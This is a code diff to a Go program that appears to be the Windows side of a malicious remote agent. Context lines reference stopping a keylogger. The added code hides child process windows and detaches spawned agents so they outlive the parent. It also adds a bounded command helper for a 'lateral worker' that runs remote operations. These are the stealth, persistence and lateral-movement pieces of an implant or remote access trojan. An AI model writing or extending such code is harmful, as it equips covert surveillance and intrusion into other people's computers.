@@ -3,6 +3,7 @@
 package main
 
 import (
+	"context"
 	"errors"
 	"fmt"
 	"os"
@@ -33,6 +34,28 @@ func stopPlatformWorkers() { _ = keylogger.stopLogging() }
 
 func newCommand(name string, args ...string) *exec.Cmd {
 	command := exec.CommandContext(agentContext, name, args...)
+	command.WaitDelay = 2 * time.Second
+	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	return command
+}
+
+// detachSpawnCommand puts a spawned agent in its own process group with no
+// inherited console so it keeps running after the parent agent exits.
+// DETACHED_PROCESS (0x00000008) is not exported by the syscall package.
+const spawnDetachedProcess = 0x00000008
+
+func detachSpawnCommand(command *exec.Cmd) {
+	command.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP | spawnDetachedProcess,
+	}
+}
+
+// newBoundedCommand creates a child bound to a caller-supplied context with
+// the same hidden-window behavior as newCommand. The lateral worker uses it
+// so a stuck remote operation can never block the command loop forever.
+func newBoundedCommand(ctx context.Context, name string, args ...string) *exec.Cmd {
+	command := exec.CommandContext(ctx, name, args...)
 	command.WaitDelay = 2 * time.Second
 	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return command
